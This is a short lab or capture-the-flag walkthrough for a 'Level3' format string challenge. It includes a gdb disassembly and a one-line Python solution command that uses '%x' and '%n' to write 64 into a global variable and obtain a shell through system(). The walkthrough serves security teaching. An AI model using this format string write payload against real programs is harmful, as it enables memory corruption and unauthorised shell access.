## Level3 - Format String Attacks
---

### Steps to solve
- #### Use gdb to get the assembly of the program and tracking instructions.
- #### analyse the instructions searsh about call functions or operations.
    ```java
    (gdb) disas main
    Dump of assembler code for function main:
    0x08048520 <+6>:     call   0x80484a4 <v> 
    0x08048526 <+12>:    ret    
    End of assembler dump.
    (gdb) disas v
    Dump of assembler code for function v:
    0x080484a7 <+3>:     sub    $0x218,%esp
    0x080484ad <+9>:     mov    0x8049860,%eax
    0x080484b2 <+14>:    mov    %eax,0x8(%esp)
    0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
    0x080484be <+26>:    lea    -0x208(%ebp),%eax
    0x080484c4 <+32>:    mov    %eax,(%esp)
    0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
    0x080484cc <+40>:    lea    -0x208(%ebp),%eax
    0x080484d2 <+46>:    mov    %eax,(%esp)
    0x080484d5 <+49>:    call   0x8048390 <printf@plt>
    0x080484da <+54>:    mov    0x804988c,%eax
    0x080484df <+59>:    cmp    $0x40,%eax
    0x080484e2 <+62>:    jne    0x8048518 <v+116>
    0x080484e4 <+64>:    mov    0x8049880,%eax
    0x080484e9 <+69>:    mov    %eax,%edx
    0x080484eb <+71>:    mov    $0x8048600,%eax
    0x080484f0 <+76>:    mov    %edx,0xc(%esp)
    0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
    0x080484fc <+88>:    movl   $0x1,0x4(%esp)
    0x08048504 <+96>:    mov    %eax,(%esp)
    0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
    0x0804850c <+104>:   movl   $0x804860d,(%esp)
    0x08048513 <+111>:   call   0x80483c0 <system@plt>
    0x08048518 <+116>:   leave  
    0x08048519 <+117>:   ret    
    End of assembler dump.
    (gdb)
    ```
- #### try to get the source code, there is a `cmp` operation between a global variable `m` and `0x40` (64) if its true execute shell else exit.
- #### detect the vulnrability type, which is format string in this case we can give formats to read values from stack or to write in a address.
- #### use `%n` to change the value of `m` we need to put exactly 64 in `m`.
- #### solution command 
    ```sh
        (python -c 'print("\x8c\x98\x04\x08"+"a"*41+"%x"*3+"%n")'; cat) | ./level3.
    ```